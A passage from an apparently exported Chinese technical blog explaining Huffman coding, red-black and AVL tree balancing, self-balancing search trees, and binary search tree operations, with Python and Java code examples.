Tree）**，或者叫做最优二叉树。 例子例如下图中对a, b, c： 对a: WPL = 7×2 + 5×2 + 2×2 + 4×2 = 36； 对b: WPL = 7×3 + 5×3 + 2×1 + 4×2 = 46; 对c: WPL = 7×1 + 5×2 + 2×3 + 4×3 = 35; c中WPL最小， 可以验证， 它就是哈夫曼树， 而a和b都不是哈夫曼树。 对于同一组权值的叶结点， 构成的哈夫曼树可以有多种形态， 但是最小WPL值是唯一的。 赫夫曼树的构建构建过程分四步： 根据给定的n个权值{w1, w2, w3 … wn }构成n棵二叉树的集合， 每棵二叉树都只包含一个结点； 在上面的二叉树中选出两颗根结点权值最小的树， 同时另外取一个新的结点作为这两颗树的根结点， 设新节点的权值为两颗权值最小的树的权值和， 将得到的这颗树也加入到树的集合中； 在2操作后， 从集合中删除权值最小的那两颗树 重复2和3，直到集合中的树只剩下一棵为止， 剩下的这颗树就是我们要求得的赫夫曼树。 如下图所示： 哈夫曼编码（Huffman Coding）哈夫曼编码是哈夫曼树的一个应用。 哈夫曼编码（Huffman Coding）是一种编码方式，也称为“赫夫曼编码”，是David A. Huffman1952年发明的一种构建极小多余编码的方法。在计算机数据处理中，霍夫曼编码使用变长编码表对源符号进行编码，出现频率较高的源符号采用较短的编码，出现频率较低的符号采用较长的编码，使编码之后的字符串字符串的平均长度 、期望值降低，以达到无损压缩数据的目的。举个例子，现在我们有一字符串： this is an example of a huffman tree 这串字符串有36个字符，如果按普通方式存储这串字符串，每个字符占据1个字节，则共需要36 * 1 * 8 = 288bit。经过分析我们发现，这串字符串中各字母出现的频率不同，如果我们能够按如下编码： 字母 频率 编码 — 字母 频率 编码 space 7 111 s 2 1011 a 4 010 t 2 0110 e 4 000 l 1 11001 f 3 1101 o 1 00110 h 2 1010 p 1 10011 i 2 1000 r 1 11000 m 2 0111 u 1 00111 n 2 0010 x 1 10010 编码这串字符串，只需要：(7+4+4)x3 + (3+2+2+2+2+2+2)x4 + (1+1+1+1+1+1)x 5 = 45+60+30 = 135bit编码这串字符串只需要135bit！单单这串字符串，就压缩了288-135 = 153bit。 那么，我们如何获取每个字符串的编码呢？这就需要哈夫曼树了。源字符编码的长短取决于其出现的频率，我们把源字符出现的频率定义为该字符的权值。 Reference 【算法】赫夫曼树（Huffman）的构建和应用（编码、译码） - https://www.cnblogs.com/penghuwan/p/8308324.html 数据结构和算法——Huffman树和Huffman编码 - https://blog.csdn.net/google19890102/article/details/54848262 数据结构 - 哈夫曼树 - https://www.jianshu.com/p/95fba425be44","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】平衡二叉搜索树 - 红黑树（Red-Black Tree）","date":"2019-05-30T03:51:09.000Z","path":"2019/05/30/【Data-Structure】树-平衡二叉搜索树-红黑树/","text":"红黑树（Red-Black Tree）在 1972 年，慕尼黑理工大学（Technical University of Munich）的计算机科学家 Rudolf Bayer 创造了红黑树（Red-Black Tree）数据结构。 除了包含数据和左右孩子节点之外，红黑树的节点还包含了一项特别的信息 – 颜色。这个颜色只包含两种颜色，即红色和黑色。 并且，红黑树还添加了一种特殊类型的节点，称为 NIL 节点。NIL 节点将做为红黑树的伪叶子节点出现。也就是说，所有带有关键数据的节点称为内节点，而所有其他的外节点则均指向 NIL 节点。这个概念可能理解起来有些费劲，希望下面这张图有所帮助。 红黑树性质红黑树（R-B Tree）需要满足如下性质： 节点的颜色只能是红色或者黑色； 根节点是黑色的（根性质）； NIL 节点的颜色是黑色； 如果节点的颜色是红色，则其子节点均为黑色（红性质）； 从任一节点到其后代任一叶子节点的路径上的黑色节点的数量相同（黑性质）； 前面几条性质都很好解释，只有最后一条最难理解。简单的说，从树中任意一个节点开始，从该节点到其后代的任意一个 NIL 节点的路径上的黑色节点的数量必须相同。比如上图中，以根节点为例，从节点 41 到任意一个 NIL 节点的路径上，黑色节点的数量都是相同的，也就是 3 个。如从节点 41 到左下角的 NIL 节点的路径上，黑色节点包括 41, 2, NIL，所以黑色节点数量是 3 个。 性能类似于 AVL 树，红黑树也是一种自平衡二叉查找树。AVL 树的平衡性质是通过限制节点的左右子树的高度来达成，而红黑树则是通过更形象化的方式来保证树的平衡。如果一棵树满足红黑树的性质，其节点的总数量为 n，则它的高度将始终小于 $2 * log_2(n+1)$ 。鉴于这个原因，致使红黑树保证了对树的所有操作的最坏时间复杂度为 $O(log_2n)$。 红黑树的平衡插入同样是和 AVL 树一样，当对红黑树进行节点的插入和删除时，最终要的就是使其仍然符合红黑树的性质。AVL 树通过使用旋转操作（rotations）来恢复树的平衡。而红黑树则是通过重新着色（recoloring）和旋转两种操作共同来完成。这不仅需要判断节点的父节点的颜色，还需要对比叔父节点的颜色，使得红黑树的恢复过程变得更加复杂。 变色（recoloring）为了重新符合红黑树的规则，尝试把红色节点变为黑色，或者把黑色节点变为红色。 下图所表示的是红黑树的一部分，需要注意节点25并非根节点。因为节点21和节点22连续出现了红色，不符合规则4（如果节点的颜色是红色，则其子节点均为黑色），所以把节点22从红色变成黑色（变色后如下图所示）： 但这样并不算完，因为凭空多出的黑色节点打破了规则5（从任一节点到其后代任一叶子节点的路径上的黑色节点的数量相同），所以发生连锁反应，需要继续把节点25从黑色变成红色（变色后如下图所示）： 此时仍然没有结束，因为节点25和节点27又形成了两个连续的红色节点，因而违反了规则4（如果节点的颜色是红色，则其子节点均为黑色），需要继续把节点27从红色变成黑色： 旋转（rotations）左旋转逆时针旋转红黑树的两个节点，使得父节点被自己的右孩子取代，而自己成为自己的左孩子。说起来很怪异，大家看下图： 图中，身为右孩子的Y取代了X的位置，而X变成了自己的左孩子。此为左旋转。 右旋转顺时针旋转红黑树的两个节点，使得父节点被自己的左孩子取代，而自己成为自己的右孩子。大家看下图： 图中，身为左孩子的Y取代了X的位置，而X变成了自己的右孩子。此为右旋转。 调整思想红黑树的第 5 条特征规定，任一节点到它子树的每个叶子节点的路径中都包含同样数量的黑节点。也就是说当我们往红黑树中插入一个黑色节点时，会违背这条特征。 同时第 4 条特征规定红色节点的左右孩子一定都是黑色节点，当我们给一个红色节点下插入一个红色节点时，会违背这条特征。 因此我们需要在插入黑色节点后进行结构调整，保证红黑树始终满足这 5 条特征。 前面说了，插入一个节点后要担心违反特征 4 和 5，数学里最常用的一个解题技巧就是把多个未知数化解成一个未知数。我们这里采用同样的技巧，把插入的节点直接染成红色，这样就不会影响特征 5，只要专心调整满足特征 4 就好了。这样比同时满足 4、5 要简单一些。 染成红色后，我们只要关心父节点是否为红，如果是红的，就要把父节点进行变化，让父节点变成黑色，或者换一个黑色节点当父亲，这些操作的同时不能影响 不同路径上的黑色节点数一致的规则。 【插入、染红后的调整有 2 种情况：】 情况1.父亲节点和叔叔节点都是红色： 假设插入的是节点 N，这时父亲节点 P 和叔叔节点 U 都是红色，爷爷节点 G 一定是黑色。 红色节点的孩子不能是红色，这时不管 N 是 P 的左孩子还是右孩子，只要同时把 P 和 U 染成黑色，G 染成红色即可。这样这个子树左右两边黑色个数一致，也满足特征 4。 但是这样改变后 G 染成红色，G 的父亲如果是红色岂不是又违反特征 4 了？这个问题和我们插入、染红后一致，因此需要以 爷爷节点 G 为新的调整节点，再次进行调整操作，以此循环，直到父亲节点不是红的，就没有问题了。 情况2.父亲节点为红色，叔叔节点为黑色： 假设插入的是节点 N，这时父亲节点 P 是红色，叔叔节点 U 是黑色，爷爷节点 G 一定是黑色。 红色节点的孩子不能是红色，但是直接把父亲节点 P 涂成黑色也不行，这条路径多了个黑色节点。怎么办呢？ 既然改变不了你，那我们就此别过吧，我换一个更适合我的！ 我们怎么把 P 弄走呢？看来看去，还是右旋最合适，通过把 爷爷节点 G 右旋，P 变成了这个子树的根节点，G 变成了 P 的右子树。 右旋后 G 跑到了右子树上，这时把 P 变成黑的，多了一个黑节点，再把 G 变成红的，就平衡了！ 上面讲的是插入节点 N 在父亲节点 P 的左孩子位置，如果 N 是 P 的右孩子，就需要多进行一次左旋，把情况化解成上述情况。 N 位于 P 的右孩子位置，将 P 左旋，就化解成上述情况了。 红黑树的平衡删除红黑树的插入平衡需要好好理解下，如果前面没有理解，删除后的调整平衡更加难懂，前方高能，请注意！ 红黑树的删除也是分两步： 二叉查找树的删除 结构调整 二叉查找树的删除1.要删除的节点正好是叶子节点，直接删除就 OK 了（右图有错误，应该是 z 不是 r） 2.有左孩子或者右孩子，直接把这个孩子上移放到要删除的位置就好了 3.有两个孩子，就需要选一个合适的孩子节点作为新的根节点，该节点称为 继承节点 删除后的结构调整根据红黑树的第 5 个特性： 如果当前待删除节点是红色的，它被删除之后对当前树的特性不会造成任何破坏影响。而如果被删除的节点是黑色的，这就需要进行进一步的调整来保证后续的树结构满足要求。 这里研究的是删除黑色节点的情况。 调整思想为了保证删除节点父亲节点左右两边黑色节点数一致，需要重点关注父亲节点没删除的那一边节点是不是黑色。如果删除后父亲节点另一边比删除的一边黑色节点多，就要想办法搞到平衡，具体的平衡方法有如下几种方法： 把父亲节点另一边（即删除节点的兄弟树）其中一个节点弄成红色，也少一个黑色 或者把另一边多的黑色节点转过来一个 删除节点在父亲节点的左子树还是右子树，调整方式都是对称的，这里以当前节点为父节点的左孩子为例进行分析。 【删除后的调整主要分三步】： 第一步： 兄弟如果是红的，说明孩子都是黑的【旋转的情况 1 】 把兄弟搞成黑的 父亲搞成红的 左旋转父亲（嘿嘿，兄弟给我分一个黑孩子） 接下来对比旋转后的兄弟 第一步解释： 这一步的目的是将兄弟节点变成黑的，转变成第二步两种情形中的某一种情况。 在做后续变化前，这棵树还是保持着原来的平衡。 第二步，有两种情况： 情况1 ：兄弟节点的孩子都是黑色 把兄弟搞成红的 continue 下一波（这个子树搞完了，研究父亲节点，去搞上一级树，进入第三步） 第二步情况 1 解释： 这里将兄弟节点变成红色后，从它的父节点到下面的所有路径就都统一少了 1 个，同时也不影响别的特征，但是把兄弟节点变红后，如果有父亲节点也是红的，就可能违反红黑树的特征 4，因此需要到更高一级树进行鉴别、调整。 情况2 ：兄弟节点的孩子至多有一个是黑的 把不是黑的那个孩子搞黑【旋转的情况 2 】 兄弟搞红 兄弟右旋转 以后对比旋转后的兄弟 把兄弟涂成跟父亲一样的颜色 【旋转的情况 3 】 然后把父亲搞黑 把兄弟的右孩子搞黑 父亲节点左旋 研究根节点，进入第三步 第二步情况 2 解释： 旋转的情况 2 是将兄弟节点的左右孩子都移动到右边，方便后续操作，如下图所示： 旋转的情况 3 将兄弟的孩子移到左边来，同时黑色的父亲变到了左边（总之就是让左边多些黑色节点），如下图所示： 第三步： 如果研究的不是根节点并且是黑的，重新进入第一步，研究上一级树； 如果研究的是根节点或者这个节点不是黑的，就退出 把研究的这个节点涂成黑的。 第三步解释： 第三步中选择根节点为结束标志，是因为在第二步中，有可能出现我们正好给删除黑色节点的子树补上了一个黑色节点，同时不影响其他子树，这时我们的调整已经完成，可以直接设置调整节点 x = root，等于宣告调整结束。 因为我们当前调整的可能只是一棵树中间的子树，这里头的节点可能还有父节点，这么一直往上到根节点。当前子树少了一个黑色节点，要保证整体合格还是不够的。 这里需要在代码里有一个保证。假设这里 B 已经是红色的了。那么调整结束，最后对 B 节点，也就是调整目标 x 所指向的这个节点涂成黑色。这样保证前面亏的那一个黑色节点就补回来了。 前面讨论的这4种情况是在当前节点是父节点的左子节点的条件下进行的。如果当前节点是父节点的右子节点，则可以对应的做对称的操作处理，过程也是一样的。 其中具体旋转方向根据调整节点在父节点的左/右位置决定。 Reference 自平衡二叉查找树 - https://www.cnblogs.com/gaochundong/p/self_balancing_binary_search_tree.html 一篇搞懂AVL平衡二叉树 - https://zhuanlan.zhihu.com/p/34840762、 【算法】论平衡二叉树（AVL）的正确种植方法 - https://www.cnblogs.com/penghuwan/p/8166133.html 漫画：什么是红黑树？ - https://zhuanlan.zhihu.com/p/31805309 面试旧敌之红黑树（直白介绍深入理解） - https://juejin.im/entry/58371f13a22b9d006882902d https://www.cnblogs.com/nullzx/p/6128416.html","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】平衡二叉搜索树 - AVL树","date":"2019-05-30T03:13:00.000Z","path":"2019/05/30/【Data-Structure】树-平衡二叉搜索树-AVL树/","text":"AVL 树在 1962 年，俄罗斯数学家 G. M. Andel’son-Vel-skii 和 E. M. Landis 发明了第一种自平衡二叉搜索树，叫做 AVL 树。AVL 树必须维持如下平衡条件，对每个节点 n：节点 n 的左子树的高度与右子树的高度的差至多是 1。 节点的左子树或者右子树的高度可以通过上面描述的步骤来计算。如果节点仅有一个子节点，则无子节点侧的高度为 -1。 下图展示了概念上 AVL 树节点的两侧子树高度需要保持的关系。 下面是一些二叉搜索树。节点中的数字代表着节点的值，左右两侧的数字代表着左右子树的高度。其中树（a）和树（b）是合法的 AVL 树，而树（c）和树（d）则不合法，因为树中不是所有的节点都满足 AVL 的平衡性质要求。 AVL 树的平衡当创建一棵 AVL 树时，难点在于如何保证 AVL 的平衡性质要求，而不用关注对树的具体操作。 也就是说，无论是向树添加节点还是删除节点，最重要的事情就是保持树的平衡。AVL 树通过 “旋转操作（rotations）“ 来保持树的平衡。旋转操作可以重塑树的拓扑结构来恢复树的平衡，更重要的是，重塑后的树依然符合二叉搜索树的性质要求。 当向一棵 AVL 树中插入一个新的节点时，需要经过两阶段的过程。首先，插入新节点的操作将使用与向 BST 树中插入新节点时使用的相同的查找算法。新的节点将做为一个叶子节点被添加到树中合适的位置，以满足 BST 的性质要求。在添加完节点后，将导致树的结构可能已经违背 AVL 树的性质要求。所以在第二个阶段中，将遍历访问路径，来检查每个节点左右子树高度。如果存在某节点的左右子树的高度差大于 1 时，则需要使用旋转操作来处理。 平衡二叉树的修正机制当我们计算出某个结点的平衡因子的绝对值超过1时， 我们就要对其进行修正， 即通过平衡化的处理，使得不平衡的二叉树重新变得平衡。 平衡化操作的四种情况AVL在构造的时候失衡以及平衡处理的方式包括以下四种： LL失衡 - 右旋（Zig） RR失衡 - 左旋（Zag） LR失衡 - 先左旋后右旋（Zig-zag） RL失衡 - 先右旋后左旋（Zag-zig）第四种情况与第三种情况类似，为RL失衡，处理方式是先右旋后左旋（Zag-zig）。 平衡动图 这里我们可以很明显地看到平衡二叉树的优势所在： 使得查找的平均深度降低， 优化各个API的性能开销。 平衡二叉树和普通二叉搜索树区别主要在于动态方法（put,delete) ，而它们的静态方法（get,min,max,floor,ceiling, rank,select）基本是相同的。 Reference 自平衡二叉查找树 - https://www.cnblogs.com/gaochundong/p/self_balancing_binary_search_tree.html 一篇搞懂AVL平衡二叉树 - https://zhuanlan.zhihu.com/p/34840762、 【算法】论平衡二叉树（AVL）的正确种植方法 - https://www.cnblogs.com/penghuwan/p/8166133.html","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】自平衡二叉搜索树（Self-balancing Binary Search Tree）","date":"2019-05-29T13:14:59.000Z","path":"2019/05/29/【Data-Structure】树-自平衡二叉搜索树/","text":"背景实际上，二叉搜索树操作的运行时间与树的高度（Height）是有关系的。一个树的高度指的是从树的根开始所能到达的最长的路径长度。树的高度可被递归性地定义为： 如果节点没有子节点，则高度为 0； 如果节点只有一个子节点，则高度为该子节点的高度加 1； 如果节点有两个子节点，则高度为两个子节点中高度较高的加 1； 计算树的高度要从叶子节点开始，首先将叶子节点的高度置为 0，然后根据上面的规则向上计算父节点的高度。以此类推直到树中所有的节点高度都被标注后，则根节点的高度就是树的高度。 举例下图显示了几棵不同的二叉搜索树： 理想情况下，如果树中节点的数量为 n，则一棵满足平均时间复杂度为 $O(log_2n)$ 的二叉搜索树的高度，应接近于比 $log_2n$ 小的最大整数。 树 (b)上图中的三棵二叉搜索树中，树 (b) 拥有最好的高度与节点数量的比例。树 (b) 的高度为 3 ，节点数量为 8，所以 $log_28$ = 3，结果正好与树的高度相等。 树 (a)树 (a) 的节点数量为 10，而高度为 4，$log_210$ = 3.3219，比 3.3219 小的最大整数是 3，所以树 (a) 最理想的高度应该为 3。我们可以通过移动距离最远的节点到中间的某个非叶子节点，以减少数的高度，以使该树的高度与节点数量的比例达到最优。 树 (c)树 (c) 的情况是最差的，它的节点数量是 5，所以$log_25$ = 2.3219，则理想高度为 2，但实际上是 4。 分析实际上，我们真正面对的问题，是如何保证二叉搜索树的拓扑结构始终保持树高度与节点数量的最佳比例。 插入的顺序影响二叉搜索树的构造因为二叉搜索树的拓扑结构与节点的插入顺序息息相关。同样的数据集合， 插入二叉搜素树中的顺序的不同，树的形状和结构也是不同的。 以put方法为例，我们重复调用它， 用key为1, 2, 3, 4的结点构造一颗二叉搜索树。那么这颗二叉搜索树的形状取决于不同的key的插入顺序。 如果按照完全正序或者逆序输入， 二叉搜索树的形状就会走向一个不好的极端：如果按照 1 -&gt; 2 -&gt; 3 -&gt; 4 的顺序插入， 那么这颗二叉树在形状上会变得像一颗单链表！ 同样，如果按照4 -&gt; 3 -&gt; 2 -&gt;1 的顺序插入， 它在形状上会变成一颗向左倾斜的链表 为什么二叉搜索树会变得低效？二叉搜索树查找的原理和二分查找类似，就是借助于它本身的结构，在遍历查找的过程中跳过一些不必要的结点的比较，从而实现高效的查找。 BST的其他API也是借助了这一优势实现性能的飞跃。但是，在这种情况下， 查找一个结点将要像链表一样遍历它经过的所有结点， 二叉搜索树的高效之源已经丧失了。 这就是最坏的情况。 插入和删除操作都可能降低未来操作的性能上面只描述了插入操作对二叉树形状和操作性能的影响。而事实上，删除操作的效果也有类似之处： 可能使得原来分布得比较均匀的结点， 在删除部分结点之后，整体的分布变得不均匀了，并影响到未来操作的性能。 总结综上所述，我们希望在进行动态操作（插入和删除）之后，能够通过一些指标，对二叉树的形状变化进行监督， 当发现树的形状开始变得不平衡的时候， 立即修正二叉树的形状。 通过这种方式， 不断地使得二叉树的形状和构造一直维持着一个“平衡（balanced）”的状态，这种能够始终维持树平衡状态的二叉搜索树称为自平衡二叉搜索树（self-balancing binary search tree）。 自平衡二叉搜索树（Self-balancing Binary Search Tree）自平衡二叉搜索树（Self-balancing Binary Search Tree），也称为平衡二叉搜索树、（自）平衡二叉查找树或者（自）平衡二叉树。 一棵平衡树指的是树能够保持其高度与广度能够保持预先定义的比例。不同的数据结构可以定义不同的比例以保持平衡，但所有的比例都趋向于$log_2n$。那么，一颗自平衡的二叉搜索树也同样呈现出 $O(log_2n)$ 的平均时间复杂度。 有许多种不同的自平衡二叉搜索树数据结构，例如 AVL 树、红黑树（Red-Black Tree）、2-3 树、2-3-4 树、伸展树（Splay Tree）、B 树等等。 Reference 自平衡二叉查找树 - https://www.cnblogs.com/gaochundong/p/self_balancing_binary_search_tree.html 一篇搞懂AVL平衡二叉树 - https://zhuanlan.zhihu.com/p/34840762、 【算法】论平衡二叉树（AVL）的正确种植方法 - https://www.cnblogs.com/penghuwan/p/8166133.html","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】二叉搜索树（Binary Search Tree）","date":"2019-05-29T03:47:30.000Z","path":"2019/05/29/【Data-Structure】树-二叉搜索树/","text":"二叉查找树（Binary Search Tree，BST） 二叉查找树（Binary Search Tree），也称为二叉搜索树、有序二叉树（ordered binary tree）或排序二叉树（sorted binary tree），是指一棵空树或者一颗二叉树的任何节点均满足： 若节点的左子树不空，则左子树上所有节点的值均小于这个节点的值； 若节点的右子树不空，则右子树上所有节点的值均大于这个节点的值； 节点的左、右子树也分别为二叉查找树； 没有值相等的节点 如果对一棵二叉搜索树进行中序遍历，会得到一个已经将各结点的值按从小到大的顺序排列好的序列，所以也称二叉搜索树为二叉排序树。 比如，对上面的二叉搜索树进行中序遍历，结果为：10 15 20 25 30 35 40 45 50。 二叉查找树的意义二分查找很好的解决了查找问题，将时间复杂度从 $O(n)$降到了$O(log_2n)$。 但是二分查找的前提条件是数据必须是有序的，并且具有线性的下标。 对于线性表，可以很好的应用二分查找，但是在插入和删除操作时则可能会造成整个线性表的动荡，时间复杂度达到了$O(n)$。 链表更是没法应用二分查找。 于是我们引入二叉查找树，在理想情况下，其在查找、插入、删除都能够达到$O(log_2n)$的时间复杂度。 性能分析在二叉查找树中查找节点，理想情况下，每次检查后，待检查的节点数都会减半。 如下图中的二叉查找树，包含了 15 个节点。从根节点开始执行查找算法，第一次比较决定我们是移向左子树还是右子树。对于任意一种情况，一旦执行这一步，我们需要访问的节点数就减少了一半，从 15 降到了 7。同样，下一步访问的节点也减少了一半，从 7 降到了 3，以此类推。 根据这一特点，查找算法的时间复杂度应该是 $O(log­_2n)$，简写为 $O(lg n)$。$log­_2n = y$，相当于 2y = n。即，如果节点数量增加 n，查找时间只缓慢地增加到 $log­_2n$。 下图中显示了 $O(log_­2n)$ 和线性增长 $O(n)$ 的增长率之间的区别。时间复杂度为 $O(log­_2n)$ 的算法运行时间为下面那条线。 从上图可以看出，$O(log­_2n)$ 曲线几乎是水平的，随着 n 值的增加，曲线增长十分缓慢。举例来说，查找一个具有 1000 个元素的数组，需要查询 1000 个元素，而查找一个具有 1000 个元素的二叉查找树，仅需查询不到10 个节点（$log_21024$ = 10）。 而实际上，对于二叉查找树查找算法来说，其十分依赖于树中节点的拓扑结构，也就是节点间的布局关系。下图描绘了一个节点插入顺序为 20, 50, 90, 150, 175, 200 的二叉查找树。这些节点是按照递升顺序被插入的，结果就是这棵树没有广度（Breadth）可言。也就是说，它的拓扑结构其实就是将节点排布在一条线上，而不是以扇形结构散开，所以查找时间也为 O(n)。 当二叉查找树中的节点以扇形结构散开时，对它的插入、删除和查找操作最优的情况下可以达到亚线性的运行时间 $O(log_2n)$。因为当在 BST 中查找一个节点时，每一步比较操作后都会将节点的数量减少一半。尽管如此，如果拓扑结构像上图中的样子时，运行时间就会退减到线性时间 O(n)。因为每一步比较操作后还是需要逐个比较其余的节点。也就是说，在这种情况下，在二叉查找树中查找节点与在数组（Array）中查找就基本类似了。 因此，二叉查找树查找时间依赖于树的拓扑结构。最佳情况是 $O(log­_2n)$，而最坏情况是 O(n)。 总结二叉查找树相比于其他数据结构的优势在于查找、插入的时间复杂度较低，在理想情况下，均为$O(log_2n)$。 查找：理想情况/平均情况$O(log_2(n))$，最坏情况$O(n)$。插入：理想情况/平均情况$O(log_2(n))$，最坏情况$O(n)$。删除：理想情况/平均情况$O(log_2(n))$，最坏情况$O(n)$。 二叉搜索树的常用操作查找节点查找指定值的元素在二叉搜索树bb中查找xx的过程为： 若b是空树，则搜索失败，否则： 若x等于b的根节点的数据域之值，则查找成功；否则： 若x小于b的根节点的数据域之值，则递归搜索左子树；否则: 递归查找右子树 使用python实现如下： 123456789def search(root, val): if root == None: return False, None elif val &gt; root.val: return search(root.right, val) elif val &lt; root.val: return search(root.left, val) else: return True, root 查找二叉搜索树中最小值对应节点查找二叉搜索树中最大值对应节点 插入节点向一个二叉搜索树bb中插入一个节点ss的算法，过程为： 若b是空树，则将s所指结点作为根节点插入，否则： 若s.val等于b的根节点的数据域之值，则返回，否则： 若s.val小于b的根节点的数据域之值，则把s所指节点插入到左子树中，否则： 把s所指节点插入到右子树中（新插入节点总是叶子节点） 1234567891011def insert(self, root, node): \"\"\"insert inplace\"\"\" if root == None: root = node return if node.val == root.val: return elif node.val &gt; root.val: self.insert(root.right, node) else: self.insert(root.left, node) 删除节点二叉搜索树的节点删除操作分以下三种情况： 1 如果待删除的节点是一个叶子节点，那么可以立即删除这个节点例：删除值为16的节点，因为该节点是叶子节点，因此可以直接删除。 2 如果待删除节点有一个子节点，则要先将当前子节点对应的树上移到待删除节点的父节点下，再删除待删除节点例：删除值为25的节点，而它下面有且只有一个子节点（这个子节点的值为35）。则在删除前，需要先将该子节点上移到待删除节点的父节点下（该父节点的值为17）。 3 如果待删除节点有两个子节点，则将其右子树的最小值代替此节点的数据，并将其右子树的具有最小值的节点删除例：删除值为5的节点，要先找到待删除节点的右子树中的最小节点（在这个过程中，用一个临时变量successor，以存储在值为5的节点的右子树中搜索到的最小节点），我们发现，待删除节点的右子树中的最小节点为7，因此用最小节点7替换被删除节点，再删除之前的最小节点7，以维持二叉树结构。 二叉树的存储结构实现对于二叉树，我们还是习惯的选择采用链式存储结构实现。 二叉树结点定义二叉搜索树最大的特点，就是他的元素是可以比较大小的。这一点是需要注意的地方。 12345678910111213141516171819202122232425262728293031323334353637public class TreeNode&lt;T extends Comparable&lt;T&gt;&gt; &#123; // 数据域 private T data; // 左子树 public TreeNode&lt;T&gt; leftChild; // 右子树 public TreeNode&lt;T&gt; rightChild; public TreeNode(T data) &#123; this(null, data, null); &#125; public TreeNode(TreeNode leftChild, T data, TreeNode rightChild) &#123; this.leftChild = leftChild; this.data = data; this.rightChild = rightChild; &#125; public T getData() &#123; return data; &#125; public TreeNode&lt;T&gt; getLeftChild() &#123; return leftChild; &#125; public TreeNode&lt;T&gt; getRightChild() &#123; return rightChild; &#125; public void setData(T data) &#123; this.data = data; &#125;&#125; 二叉搜索树插入实现有了根节点，我们就可以根据二叉树的性质，从根节点出发，构建出一颗二叉树。 123456789101112131415161718192021222324252627/** * 树中插入元素 */void insert(T value) &#123; if (value == null) &#123; return; &#125; root = insert(root, value);&#125;private TreeNode&lt;T&gt; insert(TreeNode&lt;T&gt; node, T value) &#123; if (node == null) &#123; // 树为空,则创建根节点 return new TreeNode&lt;&gt;(value); &#125; else &#123; if (compare(node, value) &lt; 0) &#123; // 插入值比根节点小，在左子树继续创建二叉搜索树 node.leftChild = insert(node.getLeftChild(), value); &#125; else if (compare(node, value) &gt; 0) &#123; // 插入值比根节点大，在右子树继续创建二叉搜索树 node.rightChild = insert(node.getRightChild(), value); &#125; &#125; return node;&#125;private int compare(TreeNode&lt;T&gt; node, T value) &#123; return value.compareTo(node.getData());&#125; 根据二叉搜索树的特性，我们很容易使用递归实现二叉树的插入操作；总的来说，就是每次插入一个结点，从根节点出发作比较，小的就往左子树插，大的就往右子树插。这和二叉搜索树的定义时完全一致的。 二叉搜索树查找实现通过插入操作，我们已经实现了一颗二叉搜索树，下面就来看看如何从树中查找元素。 查找最大值与最小值根据二叉搜索树的特点，我们知道在一颗二叉搜索树上，最小的值一定在最最左边的结点上，而最大值一定在最最右边的结点上。因此，查找二叉树最值就变得非常容易了。 12345678910111213141516171819202122232425262728293031323334353637/** * 查找最大值 */public T findMax() &#123; if (isEmpty()) return null; return findMax(root);&#125;/** * 从特定结点开始寻找最大值 */private T findMax(TreeNode&lt;T&gt; node) &#123; TreeNode&lt;T&gt; temp = node; while (temp.getRightChild() != null) &#123; temp = temp.getRightChild(); &#125; return temp.getData();&#125;/** * 查找最小值 */public T findMin() &#123; if (isEmpty()) return null; return findMin(root);&#125;/** * 从特定结点开始寻找最小值 */private T findMin(TreeNode&lt;T&gt; node) &#123; TreeNode&lt;T&gt; temp = node; while (temp.getLeftChild() != null) &#123; temp = temp.getLeftChild(); &#125; return temp.getData();&#125; 可以看到，算法实现非常简单，就是不断后移结点找到没有子树的结点，就是最边界位置的结点了。 查找特定值在二叉搜索树中，怎样快速找到一个值为特定元素的结点呢？想想我们是怎样实现结点插入的？这个问题就很简单了。 递归实现，查找特定结点 123456789101112131415161718192021222324252627282930/** * find 特定值 递归实现 */public TreeNode&lt;T&gt; find(T value) &#123; if (isEmpty()) &#123; return null; &#125; else &#123; return find(root, value); &#125;&#125;private TreeNode&lt;T&gt; find(TreeNode&lt;T&gt; node, T value) &#123; if (node == null) &#123; // 当查找一个不在树中元素时，抛出异常 throw new RuntimeException(\"the value must not in the tree\"); &#125; if (compare(node, value) &lt; 0) &#123; // 小于根节点时，从去左子树找 return find(node.getLeftChild(), value); &#125; else if (compare(node, value) &gt; 0) &#123; // 大于根节点时，从右子树找 return find(node.getRightChild(), value); &#125; else &#123; // 刚好等于，找到了 return node; // 剩下还有一种情况，就是不等于，也就是所查找的元素不在树中 &#125;&#125; 查找的实现思路，总体上和插入是一致的；无非就是做不同的操作；这里需要注意的是，为了程序的健壮性，我们还得考虑如果查找的元素不在树中这种情况。 迭代实现，查找特定值 有了前面查找最大值、最小值的经验，我们也可以考虑使用迭代算法实现查找指定元素的算法。 1234567891011121314151617/** * 查找特定值-非递归实现 */public TreeNode&lt;T&gt; findIter(T value) &#123; TreeNode&lt;T&gt; current = root; while (current != null) &#123; if (compare(current, value) &lt; 0) &#123; current = current.getLeftChild(); &#125; else if (compare(current, value) &gt; 0) &#123; current = current.getRightChild(); &#125; else &#123; return current; &#125; &#125; // current为null,说明所查找的元素不在tree里 return null;&#125; 这里同样测试一下，查找方法的正确性： 12345678System.out.printf(&quot;\\nfind value %d in mSearchTree \\n&quot;, 12);TreeNode mTreeNode = mSearchTree.find(12);TreeNode mTreeNode_1 = mSearchTree.findIter(12);System.out.println(&quot;递归实现结点 = :&quot; + mTreeNode + &quot;, value=&quot; + mTreeNode.getData());System.out.println(&quot;非递归实现结点= :&quot; + mTreeNode_1 + &quot;, value=&quot; + mTreeNode_1.getData());System.out.println(&quot;\\nfind the max value in mSearchTree = &quot; + mSearchTree.findMax());System.out.println(&quot;find the min value in mSearchTree = &quot; + mSearchTree.findMin()); 输出： 123456find value 12 in mSearchTree 递归实现结点 = :com.avaj.datastruct.tree.bst.TreeNode@4b67cf4d, value=12非递归实现结点= 